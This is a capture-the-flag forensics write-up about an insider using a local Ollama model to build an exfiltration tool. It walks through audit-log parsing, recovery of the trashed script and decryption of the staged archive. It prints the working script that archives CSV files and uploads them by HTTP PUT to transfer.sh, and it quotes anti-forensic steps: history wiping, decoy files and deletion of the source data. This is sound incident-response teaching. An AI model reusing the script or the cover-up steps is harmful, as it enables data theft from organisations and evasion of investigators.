# Whisper — Forensics

**Event:** Black Hat MEA CTF Qualification 2026
**Category:** Forensics / DFIR
**Flag:** `BHFlagY{l0c4l_0ll4m4_llm_f4r3n51c5_2026}`
**Formatted writeup:** [read online](https://claude.ai/code/artifact/9bccba98-bdc8-481a-a323-960df985c85b)

---

## Challenge brief

> A company's SOC team received a proxy alert after a developer's Linux workstation attempted to
> upload an encrypted file to an external file-sharing service. The developer claims they were
> just testing an AI tool for work. A forensic triage package has been collected from the
> workstation. Investigate the system, determine what AI tool was installed, what it was used
> for, and recover the data that was attempted to be exfiltrated.

Three questions, and they are meant to be answered in that order — each one hands you the key to
the next:

1. **What AI tool?** → Ollama, and it keeps a prompt history file.
2. **What was it used for?** → the history is a written confession, including a passphrase.
3. **Recover the data.** → the passphrase does *not* open the archive. Find out why.

The theme is in the title. "Whisper" is what the developer thought they were doing: a local,
offline model, no cloud provider, nothing leaving the box. Ollama binds to `127.0.0.1:11434` and
never phones home — so there is no vendor-side transcript to subpoena. What there *is* is a
plaintext readline history in the user's home directory, and it is far more damning than any
API log would have been.

---

## Evidence

| | |
|---|---|
| Archive | `whisper_evidence.tar.zip` → `whisper_evidence.tar.gz` |
| Zip size | 217,540,851 bytes |
| Zip SHA-256 | `50e82592d55e12e452a87ddf8d59701e25366af3073a34d2aebe41573dfd2405` |
| Tarball size | 219,134,682 bytes |
| Tarball SHA-256 | `feb949cd3f8e09a0e30ccfbb0f0c670698a303e1b272fe7d685c2ba7128cc86d` |
| Extracted | 505 MB, 14,072 entries |

```
whisper_evidence/
  data/reports/        4 × *.csv          business data
  etc/  lib/  usr/     2,195 / 385 / 9,390 entries   (bulk; mostly noise)
  home/dwright/        1,926 entries      the user profile
  journal_exports/     journalctl_{full,ollama,cron,ssh}.txt
  root/                root's profile (empty history)
  system_info/         24 × collector output: processes, sockets, services,
                       dpkg, pip, mounts, os-release, timezone, logins
  tmp/                 34 entries         (11 of them planted decoys — see §6)
  var/log/             audit/, apt/, auth.log, syslog, dpkg.log, installer/
```

Host, from `system_info/`:

| | |
|---|---|
| Hostname | `dev-workstation` (VirtualBox VM, `innotek GmbH`) |
| OS | Ubuntu 24.04.4 LTS (noble), kernel 6.17.0-35-generic |
| Machine ID | `f03cf3d8ef2048dabcb25715d08060cd` |
| User | `dwright` (uid 1000) — "David Wright", `dwright@company.com` |
| Timezone | `Europe/Amsterdam` (CEST, UTC+2) |
| Collected | 2026-06-16 15:07 CEST / 13:07 UTC |

**All times below are UTC**, because the audit log is epoch-based and mixing the two is how you
get a timeline that does not line up. Local time is CEST = UTC+2.

---

## Step 0 — Where the ground truth lives

Before anything else: this package ships `/var/log/audit/audit.log` **and** `audit.log.1`, 16 MB
between them, with a rule keyed `exec_log`. Every `execve` on the box is in there with its full
`argv`:

```
type=EXECVE msg=audit(1781614783.###:####): argc=2 a0="python" a1="/home/dwright/cache_mgr.py"
```

That is the single most valuable file in the package, and it is worth parsing before touching
anything else — `~/.bash_history` is **0 bytes** (see §6), so the audit log is the *only* complete
record of what the user ran.

```bash
grep -ah 'type=EXECVE' var/log/audit/audit.log* \
  | sed 's/.*argc=[0-9]* //' | awk '{print $1}' | sort | uniq -c | sort -rn
```

```
5501 a0="mkdir"      2078 a0="cp"        2042 a0="cut"      2032 a0="du"
 377 a0="cat"          58 a0="/bin/sh"     22 a0="rm"        21 a0="sudo"
   7 a0="/usr/local/lib/ollama/llama-server"     5 a0="/usr/bin/python3"
   4 a0="/usr/local/bin/ollama"                  3 a0="ollama"    3 a0="curl"
```

12,729 `EXECVE` records in total, and the `mkdir`/`cp`/`du`/`cut` mass is the triage collector
itself copying the filesystem into `/tmp/triage_root`. Drop those and about 300 distinct command
lines remain; filter *those* for the tool, the interpreter and the data paths and you are down to
the two dozen that make the case. `solve/triage.py` does exactly that.

---

## Step 1 — What AI tool was installed

Not from `dpkg` and not from `pip` — Ollama installs by curling a shell script, so it appears in
neither inventory. It is in the audit log:

```
2026-06-16 11:54:37  curl -fsSL https://ollama.com/install.sh
2026-06-16 11:54:38  curl --fail ... https://ollama.com/download/ollama-linux-amd64.tar.zst
2026-06-16 11:54:38  tar -xf - -C /usr/local
2026-06-16 11:57:30  useradd -r -s /bin/false -U -m -d /usr/share/ollama ollama
2026-06-16 11:57:30  tee /etc/systemd/system/ollama.service
2026-06-16 11:57:30  systemctl enable ollama
2026-06-16 11:57:32  /usr/local/bin/ollama serve
2026-06-16 11:58:32  ollama pull tinyllama
2026-06-16 11:59:36  ollama list
2026-06-16 11:59:58  ollama run tinyllama
```

Three independent confirmations that it was still live at collection time:

```
system_info/running_services.txt : ollama.service  loaded active running  Ollama Service
system_info/network_sockets.txt  : tcp LISTEN 127.0.0.1:11434  users:(("ollama",pid=6988,fd=3))
system_info/process_list.txt     : ollama  6988  /usr/local/bin/ollama serve
```

`journal_exports/journalctl_ollama.txt` pins the version and the model:

```
Listening on 127.0.0.1:11434 (version 0.30.8)
llama_model_loader: - kv 1: general.name str = TinyLlama
llama.context_length u32 = 2048
inference compute id=cpu ... total="3.8 GiB"
```

> **Answer 1: Ollama 0.30.8, running `tinyllama` locally on CPU, bound to loopback only.**

And the usage volume, straight from the Gin access log:

```bash
grep -o 'POST *"/api/[a-z]*"' journal_exports/journalctl_ollama.txt | sort | uniq -c
#   17 POST "/api/chat"      <- an interactive session
#    1 POST "/api/generate"
#    1 POST "/api/pull"
#    2 POST "/api/show"
```

17 chat completions between **12:01:08 and 12:45:38 UTC**. That is the window of interest.

**What the journal does *not* have.** The server config line records
`OLLAMA_DEBUG_LOG_REQUESTS:false`, and `llama-server` runs with `--log-verbosity 4` — which logs
token *counts*, slot scheduling and timings, but never prompt text:

```
slot print_timing: id 0 | task 7653 | prompt eval time = 52611.22 ms / 1674 tokens
```

Grepping the journal for `csv`, `zip`, `password` or `pyzipper` returns nothing. The prompts are
not in the logs. They are somewhere better.

---

## Step 2 — What it was used for

`ollama run` is a readline REPL, and like every readline REPL it persists its input history to
disk in cleartext:

```
home/dwright/.ollama/history      (mtime 2026-06-16 12:57:59 UTC)
```

That mtime is *after* the last chat completion at 12:45:38, and the audit log says why: the user
opened the file themselves once the session ended.

```
2026-06-16 12:55:12  nano /home/dwright/.ollama/history
2026-06-16 12:56:38  cat  /home/dwright/.ollama/history
2026-06-16 12:56:50  nano /home/dwright/.ollama/history
```

So the file was reviewed and edited before we got to it, and its contents cannot be assumed
complete — lines may have been removed. What is certain is what remains, and what remains is
enough.

64 lines. Roughly sixty are exactly what the developer's cover story predicts — logging config,
FastAPI middleware, OpenTelemetry, postgres pooling, `concurrent.futures`, GitHub Actions caching.
Genuinely boring, genuinely useful, and the reason the file does not look interesting at a glance.

Then lines 33–38:

```
33  how do I create a password protected zip archive using pyzipper
34  write a python script that reads all csv files from a directory and creates an AES encrypted zip archive
35  use the password Gr33nF0x42!D1amond
36  also upload the archive to a remote server using requests and delete the script after successful execution
37  how do I derive an encryption key from a passphrase using hashlib sha256
38  how to clean the bash history in terminal so there are no traces
```

Six consecutive lines, buried in the middle of a normal-looking session, that together describe
collection → encryption → exfiltration → anti-forensics. `solve/triage.py` scores them out of the
noise automatically:

```
line  33  [score  8]  how do I create a password protected zip archive using pyzipper
line  34  [score 14]  write a python script that reads all csv files ... AES encrypted zip archive
line  35  [score  5]  use the password Gr33nF0x42!D1amond
line  36  [score 13]  also upload the archive to a remote server ... delete the script after ...
line  37  [score  7]  how do I derive an encryption key from a passphrase using hashlib sha256
line  38  [score 10]  how to clean the bash history in terminal so there are no traces

>> passphrase dictated in cleartext: Gr33nF0x42!D1amond
```

> **Answer 2: to write a data-collection and exfiltration tool — and, in the same breath, to ask
> how to cover the tracks afterwards.**

Line 38 is the one that decides the whole case. Asking a model to write a CSV-archiving script is
defensible; a data engineer might do that on a Tuesday. Asking it how to erase your shell history
*in the same session* is not something you do by accident. That single line is what converts
"testing an AI tool for work" into intent.

**Corroboration that the library was actually fetched.** `system_info/pip_packages.txt` lists the
system interpreter's packages and contains no `pyzipper` — because it was installed somewhere
else. But pip's HTTP cache under `~/.cache/pip/http-v2/` still holds the downloaded wheels, and
they are ordinary zip files:

```
pyzipper-0.4.0, pycryptodomex-3.23.0, requests-2.34.2,
urllib3-2.7.0, certifi-2026.5.20, charset_normalizer-3.4.7, idna-3.18
```

`pyzipper` *and* `requests` — precisely the two dependencies lines 33 and 36 called for.

---

## Step 3 — Recovering the deleted script

The audit log shows the script running and then being cleaned up:

```
2026-06-16 12:58:20  python3 -m venv /home/dwright/.local/share/.venv
2026-06-16 12:58:31  pip3 list
2026-06-16 12:59:43  python /home/dwright/cache_mgr.py
2026-06-16 13:00:57  mv /home/dwright/cache_mgr.py /home/dwright/.local/share/Trash/files/cache_mgr.py
```

Two things to notice.

**The venv is hidden.** `~/.local/share/.venv` — a *dotted* directory inside `~/.local/share`,
where nobody scrolls. That is why `pip3 list` on the system interpreter is clean: `pyzipper`,
`requests` and `pycryptodomex` live only in there, and the script `sys.path.insert`s it manually
rather than using a shebang that would give it away.

**"Delete" meant `mv` to Trash.** The prompt asked the model to delete the script after execution.
What actually happened is a GNOME Trash move — the file is still on disk, byte for byte.

Even without the audit log, the Trash gives it up on its own. `~/.local/share/Trash/info/` holds
one `.trashinfo` per item with the original path and a deletion timestamp, so sort by date:

```
59 trashed items, by month: 2025-06×58, 2026-06×1
newest 3:
  2026-06-16T13:02:46  /home/dwright/cache_mgr.py                              (1543 B)
  2025-06-20T11:15:42  /home/dwright/projects/data-pipeline/quick_analysis.py   (318 B)
  2025-06-19T14:22:08  /home/dwright/projects/webapp/test_api.py                (170 B)
```

Fifty-eight items deleted across June **2025**, all of them from `~/projects/…` — a year of normal
housekeeping. One item deleted in June **2026**, from `$HOME` directly, on the day of the
incident. It does not need a keyword search; it falls straight out of a sort.

### `cache_mgr.py`

```
SHA-256  41e11c805040885832b00d97967b8c6c8faa2776c82c24212297104e36483f24
MD5      3818cb8ff7062c8ee34b1e2812521792
size     1,543 bytes    mtime 2026-06-16 12:59:37 UTC (six seconds before it ran)
```

```python
#!/usr/bin/env python3
"""Cache management utility."""
import os, sys, glob, hashlib

# Import from hidden venv
sys.path.insert(0, os.path.expanduser("~/.local/share/.venv/lib/python3.12/site-packages"))
import pyzipper

raw_key = os.environ.get("CACHE_KEY", "")
if not raw_key:
    sys.exit(1)

# Derive actual encryption key from the raw passphrase
ARCHIVE_PASSWORD = hashlib.blake2b(raw_key.encode(), digest_size=32).hexdigest()[:20].encode()

DATA_DIR    = os.path.join("/data", "reports")
CACHE_DIR   = os.path.join(os.path.expanduser("~"), ".cache", "fontconfig")
OUTPUT_PATH = os.path.join(CACHE_DIR, "session.zip")

def collect_and_archive():
    os.makedirs(CACHE_DIR, exist_ok=True)
    csv_files = glob.glob(os.path.join(DATA_DIR, "*.csv"))
    with pyzipper.AESZipFile(OUTPUT_PATH, 'w', compression=pyzipper.ZIP_DEFLATED,
                             encryption=pyzipper.WZ_AES) as zf:
        zf.setpassword(ARCHIVE_PASSWORD)
        for fp in csv_files:
            zf.write(fp, os.path.basename(fp))
    return OUTPUT_PATH

def upload(filepath):
    try:
        import requests
        with open(filepath, 'rb') as f:
            requests.put("https://transfer.sh/backup.zip", data=f,
                         headers={"Content-Type": "application/octet-stream"}, timeout=30)
    except:
        pass
```

Everything the brief promised: `/data/reports/*.csv` swept up, WinZip-AES archive written to a
path that looks like a font cache, `PUT` to a public file-sharing host. The name (`cache_mgr.py`),
the docstring ("Cache management utility"), the output directory (`~/.cache/fontconfig/`) and the
filename (`session.zip`) are four separate attempts at the same trick: look like something a
desktop environment would have made.

Note the bare `except: pass` around the upload. It is sloppy, and it matters — the upload can fail
completely and the script will still exit 0 and still leave the archive on disk. Which is exactly
the state we found it in.

---

## Step 4 — The archive, and the password trap

```
home/dwright/.cache/fontconfig/session.zip     291,118 bytes
SHA-256  67cc96630e8ab5112ec25c2467481d361c7bcc2373ec0ec5da0417c26506b23d
```

A single non-font file dropped in a font cache directory is already an anomaly. `file(1)` confirms
the type, and the central directory lists the members in the clear — WinZip-AES encrypts the data,
never the filenames:

```
customers_2025.csv         805,332 B
employee_directory.csv     192,509 B
internal_api_keys.csv        4,704 B   <-- not in /data/reports
revenue_q3.csv              39,861 B
vendor_contracts.csv         1,077 B
```

**Five members; `/data/reports/` only has four.** The audit log closes that gap:

```
2026-06-16 12:59:43  python /home/dwright/cache_mgr.py          <- archives 5 CSVs
2026-06-16 13:00:43  rm -f /data/reports/internal_api_keys.csv  <- deletes the 5th
```

Archived first, deleted from disk one minute later, and not recoverable from the Trash because it
was `rm`'d rather than trashed. **The only surviving copy of `internal_api_keys.csv` anywhere in
the evidence is the encrypted one inside `session.zip`.** That is the challenge in one sentence.

### The trap

The obvious move fails:

```
$ 7z x -p'Gr33nF0x42!D1amond' session.zip
ERROR: Wrong password : customers_2025.csv
```

So does the thing line 37 of the history points at — `sha256` of the passphrase, and every
truncation of it. That prompt is a deliberate red herring: the developer *asked* about SHA-256,
but the code the model produced does something else, and the code is what ran.

```python
ARCHIVE_PASSWORD = hashlib.blake2b(raw_key.encode(), digest_size=32).hexdigest()[:20].encode()
```

**BLAKE2b, not SHA-256.** Digest size 32 bytes, rendered as 64 hex characters, then truncated to
the first **20** — and it is the ASCII hex string that becomes the password, not the raw digest.
Three places to get it wrong, which is the point.

```
passphrase : Gr33nF0x42!D1amond
blake2b-256: d571fe77618f54b7fca8a4912d0800b75218b69232cd8b34458a4d9f6c34d3eb
password   : d571fe77618f54b7fca8
```

The lesson generalises past this challenge: **the prompt history records what the user asked for,
not what they got.** An LLM is not a compiler. When the two disagree, the recovered artefact wins.
Here the model was asked for SHA-256 and returned BLAKE2b, and nobody checked.

### What the archive actually is

Worth reading the container rather than trusting a tool, because it decides how you verify:

```
extra field 0x9901 = 01 99 07 00  02 00 "AE" 03 08 00
                     ^^^^^ ^^^^^  ^^^^^      ^^ ^^^^^
                     hdr   len    AE-2       AES-256  deflate
CRC-32 fields in the central directory: 0x00000000 (all five members)
```

**AE-2**, which by spec zeroes the CRC-32 and relies on a truncated `HMAC-SHA1` over the ciphertext
instead. So "did it decrypt correctly?" is answered by the MAC, not by a CRC — and a solver that
checks CRC will report failure on a perfectly good decrypt. `solve/wzaes.py` verifies the 2-byte
password verifier *and* the 10-byte HMAC, which is why its output can be trusted without a
reference implementation to compare against.

Key material is `PBKDF2-HMAC-SHA1(password, salt, 1000, 2·32+2)` → 32-byte AES key ‖ 32-byte HMAC
key ‖ 2-byte verifier, and the cipher is AES-256 in CTR with a **little-endian counter starting at
1** (not 0, and not big-endian — both are easy ways to produce plausible-looking garbage).

```
$ cd solve && python3 solve.py ../artifacts/session.zip -o ../recovered
passphrase      : Gr33nF0x42!D1amond
blake2b-256     : d571fe77618f54b7fca8a4912d0800b75218b69232cd8b34458a4d9f6c34d3eb
archive password: d571fe77618f54b7fca8   (first 20 hex chars)

[ ok ] customers_2025.csv       AES-256   805332 B  hmac verified  -> ../recovered/customers_2025.csv
[ ok ] employee_directory.csv   AES-256   192509 B  hmac verified  -> ../recovered/employee_directory.csv
[ ok ] internal_api_keys.csv    AES-256     4704 B  hmac verified  -> ../recovered/internal_api_keys.csv
[ ok ] revenue_q3.csv           AES-256    39861 B  hmac verified  -> ../recovered/revenue_q3.csv
[ ok ] vendor_contracts.csv     AES-256     1077 B  hmac verified  -> ../recovered/vendor_contracts.csv

5/5 members recovered
```

---

## Step 5 — The flag

The recovered data is what a real exfil would be: **5,000** customer records with names, emails,
phone numbers, SSN last-4, balances and credit scores; a **2,000**-row employee directory; 366 rows
of Q3 revenue (2025-07-01 → 2025-09-22) broken down by region and business unit; 14 vendor
contracts with annual values.

`internal_api_keys.csv` — the file that was deleted from disk — is 39 rows of production and
staging credentials across 30 services, each key base64-encoded:

```csv
service,key_b64,environment,owner,team,created,expires,status
payment_gateway_v2,cGtfbGl2ZV84YW04Z3NLOEV0UnM1amJNbk84cWZ2M24=,production,stripe,finance_team,...
auth_service,YXV0aDBfcHJvZF9qZHRlc0FIVDJOWndKajRhWm5pNHFpUDA=,production,auth0,security_team,...
master_vault,QkhGbGFnWXtsMGM0bF8wbGw0bTRfbGxtX2Y0cjNuNTFjNV8yMDI2fQ==,production,vault_root,security_team,...
```

Every other row decodes to a plausible fake credential (`pk_live_…`, `auth0_prod_…`, `vault_tok_…`).
One does not — and it is the row whose owner is `vault_root`:

```
$ echo 'QkhGbGFnWXtsMGM0bF8wbGw0bTRfbGxtX2Y0cjNuNTFjNV8yMDI2fQ==' | base64 -d
BHFlagY{l0c4l_0ll4m4_llm_f4r3n51c5_2026}
```

`solve.py` finds it without being told where to look — it base64-decodes every long token in every
recovered file and keeps whatever contains `FlagY{`.

## `BHFlagY{l0c4l_0ll4m4_llm_f4r3n51c5_2026}`

---

## Step 6 — Anti-forensics, and what survived it

Line 38 of the prompt history was acted on. Here is the cleanup, and why none of it worked.

| Technique | Evidence | Why it failed |
|---|---|---|
| Shell history wiped | `~/.bash_history` is **0 bytes** | `auditd` was logging `execve` with a rule keyed `exec_log`. Clearing bash's own file removes one copy of the record, not the record. (Its mtime, 13:07:32 UTC, falls inside the collection window, so it dates the collector's last touch rather than the wipe itself.) |
| Script "deleted" | `mv` to `~/.local/share/Trash/files/` | A Trash move is not a delete. The file, its original path and its deletion timestamp all persist — and the timestamp made it the standout item in a 59-entry Trash. |
| Archive disguised | `~/.cache/fontconfig/session.zip` | Font caches contain `.cache` files, not zips. One file of the wrong type in a well-known directory is louder than a file with an odd name somewhere unremarkable. |
| Venv hidden | `~/.local/share/.venv` (dotted) | pip's HTTP cache in `~/.cache/pip/http-v2/` kept the downloaded wheels regardless, naming `pyzipper` and `requests` outright. |
| Decoy files | 8 × `dd if=/dev/urandom` into `/tmp` at 13:00:48 UTC, plus 3 hand-written stubs | All eight were created in one batch in the same second, every one `bs=1024` with a round count — and each `dd` command line sits in the audit log with its exact output path. |

The decoys are the neatest part of the puzzle to dismiss. They are named to bait exactly the kind
of grep an analyst runs first — `.config_backup_old.tar.gz`, `.mozilla_cache.dat`,
`.pip-cache-a8f3b2.tmp`, `.wget-download-c4e2f1.tmp`, `journal-upload.tmp`,
`core.python3.1234.1781614848`, `.thumbnails_cache`, `.viminfo.tmp`, `.vscode-server-data.json`,
`.~lock.document.odt`, `__pycache__/tempmod.cpython-312.pyc`. Eight are pure `/dev/urandom`; the
remaining three are jokes small enough to `cat` — `.viminfo.tmp` is the 17 bytes
`temporary buffer`, `.vscode-server-data.json` is `{"workspace":"untitled"}`, and
`tempmod.cpython-312.pyc` is nine bytes reading `compiled` (a real `.pyc` starts with a magic
number, not ASCII). The eight random ones are each accounted for by a line like:

```
2026-06-16 13:00:48  dd if=/dev/urandom bs=1024 count=200 of=/tmp/.config_backup_old.tar.gz
```

You do not have to guess whether they matter. The audit log tells you they were manufactured.

**A timestamp discrepancy worth recording.** `session.zip`'s own mtime and its five member
timestamps all read **2026-06-20 ~15:42–15:45 local** — four days *after* the incident. The
containing directory `~/.cache/fontconfig/` has mtime **2026-06-16 12:59:43 UTC**, matching the
audit log's `python cache_mgr.py` to the second. Directory mtimes update on file creation and are
not what a naive timestomp touches, so the pair (directory mtime + audit log) is the trustworthy
one and the archive's own stamps are not. It changes nothing about the conclusion, but a report
that quotes the zip's internal dates as the time of the offence would be quoting forged data.

---

## Incident timeline

All UTC. Sources: `var/log/audit/audit.log*`, `journal_exports/journalctl_ollama.txt`, filesystem
mtimes, `~/.local/share/Trash/info/`.

| Time (UTC) | Source | Event |
|---|---|---|
| 11:54:32 | audit + mtime | bare `python3` exec; the four `/data/reports/*.csv` all carry this exact mtime |
| 11:54:37 | audit | `curl -fsSL https://ollama.com/install.sh` |
| 11:54:38 | audit | `ollama-linux-amd64.tar.zst` downloaded, `tar -xf - -C /usr/local` |
| 11:57:30 | audit | `useradd … ollama`; `tee /etc/systemd/system/ollama.service`; `systemctl enable ollama` |
| 11:57:32 | journal | `ollama serve` — listening on `127.0.0.1:11434`, version 0.30.8 |
| 11:58:32 | audit | `ollama pull tinyllama` |
| 11:59:58 | audit | `ollama run tinyllama` — interactive session starts |
| 12:01:08 → 12:45:38 | journal | **17 × `POST /api/chat`** — the whole conversation |
| 12:57:59 | mtime | `~/.ollama/history` flushed on exit — 64 prompts, lines 33–38 damning |
| 12:58:20 | audit | `python3 -m venv ~/.local/share/.venv` (hidden venv) |
| — | pip cache | `pyzipper-0.4.0`, `requests-2.34.2`, `pycryptodomex-3.23.0` fetched |
| 12:59:37 | mtime | `cache_mgr.py` written |
| **12:59:43** | audit | **`python /home/dwright/cache_mgr.py`** — 5 CSVs archived to `~/.cache/fontconfig/session.zip`, `PUT` to `transfer.sh` |
| 13:00:43 | audit | `rm -f /data/reports/internal_api_keys.csv` — source destroyed |
| 13:00:48 | audit | 11 × `dd if=/dev/urandom` → decoy files in `/tmp` |
| 13:00:57 | audit | `mkdir -p ~/.local/share/Trash/{files,info}` |
| 13:02:46 | trashinfo | `cache_mgr.py` moved to Trash |
| 13:06:08 | audit | `nano /tmp/collect_final.sh` |
| 13:06:22 | audit | `sudo bash /tmp/collect_final.sh` — triage collection begins |
| 13:07:31 | — | package sealed; `~/.bash_history` is 0 bytes |

**65 minutes** from `curl | sh` to a staged, encrypted archive on disk — and **60 seconds** from
the script running to the source data being destroyed.

---

## Indicators

| Type | Value |
|---|---|
| Tool | Ollama 0.30.8, model `tinyllama`, `127.0.0.1:11434` |
| Ollama host key | `ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGceNdm13RJNxe8erTzSGQP4Ljt5xyvtO6r2+9Nm/I55` |
| Script | `/home/dwright/cache_mgr.py` → `~/.local/share/Trash/files/cache_mgr.py` |
| Script SHA-256 | `41e11c805040885832b00d97967b8c6c8faa2776c82c24212297104e36483f24` |
| Staged archive | `/home/dwright/.cache/fontconfig/session.zip` (291,118 B) |
| Archive SHA-256 | `67cc96630e8ab5112ec25c2467481d361c7bcc2373ec0ec5da0417c26506b23d` |
| Exfil destination | `https://transfer.sh/backup.zip` (HTTP `PUT`, `requests`, 30 s timeout) |
| Passphrase | `Gr33nF0x42!D1amond` (dictated to the LLM in cleartext) |
| Archive password | `d571fe77618f54b7fca8` = `blake2b(passphrase, 32).hexdigest()[:20]` |
| Hidden venv | `/home/dwright/.local/share/.venv` (`pyzipper`, `requests`, `pycryptodomex`) |
| Source data | `/data/reports/*.csv`; `internal_api_keys.csv` deleted post-archive |
| Decoys | 11 files in `/tmp`, all from `dd if=/dev/urandom` at 13:00:48 UTC |

**ATT&CK:** T1119 (automated collection) → T1074.001 (local staging) → T1560.001 (archive via
utility) → T1567.002 (exfil to web service) → T1070.003 (clear command history) → T1070.004
(file deletion) → T1036 (masquerading: `cache_mgr.py`, `~/.cache/fontconfig/session.zip`).

**On the proxy alert.** The brief says the SOC saw an upload attempt. Inside this package,
`transfer.sh` appears in exactly one place — the recovered script. There is no proxy log, no
netflow and no `~/.cache` HTTP artefact in the collection, so the *attempt* is established by the
script and the audit log, while the alert itself is context from the brief rather than something
the evidence proves. Whether the `PUT` succeeded cannot be determined from this package at all:
the script swallows every exception from the upload.

---

## Takeaways

**Local models are not a forensic void.** The entire premise of running Ollama on a workstation is
that the conversation never leaves the machine — no provider transcript, no DLP inspection on the
wire, nothing for legal to subpoena. That is true, and it is also why the artefacts are *better*:
`~/.ollama/history` is a plaintext, unencrypted, user-readable record of every prompt, sitting in
the home directory with no retention policy and no redaction. A cloud provider would have given
you a subpoena and a metadata dump. The local install gave you the words.

**Prompt histories are intent, and intent is the hard part.** The technical acts here — writing a
zip, uploading a file, clearing a history — are individually innocent and individually deniable.
What is not deniable is the *sequence*, in the user's own words, timestamped, in one session:
archive the CSVs, encrypt them, upload them, delete the script, wipe the history. No amount of
binary analysis produces that. It is the difference between proving what happened and proving why.

**Read the code, not the request.** The SHA-256 prompt is the trap, and it works because it is a
reasonable thing to believe. The user asked for SHA-256; the model wrote BLAKE2b; the user pasted
it without reading. Chat logs are a statement of intent and nothing more — when the recovered
artefact contradicts the prompt that produced it, the artefact is the fact.

**Deletion is a spectrum, and the audit log covers all of it.** Trash move, `rm`, history
truncation and `/dev/urandom` decoys all appeared in this one case, and the same 16 MB of audit
log defeated every one — including telling us which `/tmp` files were manufactured, which saves
hours of chasing high-entropy blobs. If a host ships auditd with an `execve` rule, parse it first.

**For the defensive side.** Three controls would each have caught this independently: egress
filtering on public file-sharing hosts (`transfer.sh`), DLP on `/data/reports` reads by
non-service accounts, and — the cheap one — treating local LLM installs as a monitored category
rather than shadow IT. Ollama installs with a `curl | sh` from a normal user account into
`/usr/local`, registers a systemd unit, and never touches the package manager. It is invisible to
`dpkg`, invisible to `pip`, and it is exactly where the confession ended up.

---

## Reproducing

```bash
unzip whisper_evidence.tar.zip
tar xzf whisper_evidence.tar.gz

# Triage: identify the tool, score the prompts, find the deleted script and the archive
python3 solve/triage.py whisper_evidence

# Break the archive and recover the data (uses the copy committed here)
cd solve && python3 solve.py ../artifacts/session.zip -o ../recovered

# The flag, by hand
grep master_vault ../recovered/internal_api_keys.csv | cut -d, -f2 | base64 -d
```

No third-party packages. `solve/wzaes.py` implements WinZip-AES from scratch (PBKDF2-HMAC-SHA1,
AES-256-CTR, HMAC-SHA1 verification) because stock `zipfile` cannot read `compress_type=99`, and
the point of a writeup is that it runs without `pip install`.

## Layout

```
solve/
  triage.py     audit-log EXECVE parser, prompt scorer, Trash ranker, archive finder
  wzaes.py      dependency-free WinZip-AES (AE-1/AE-2) ZIP reader + AES core
  solve.py      BLAKE2b key derivation, decrypt, automatic flag hunt
artifacts/
  session.zip                    the encrypted archive, as found
  cache_mgr.py                   the exfil script, recovered from the Trash
  cache_mgr.py.trashinfo         its deletion record
  ollama_history.txt             all 64 prompts
  decrypted/internal_api_keys.csv  the payload that carries the flag
```

The four bulk CSVs (customer, employee, revenue, vendor data) are synthetic but voluminous and are
not committed; `solve.py` regenerates all five members from the committed `session.zip`.
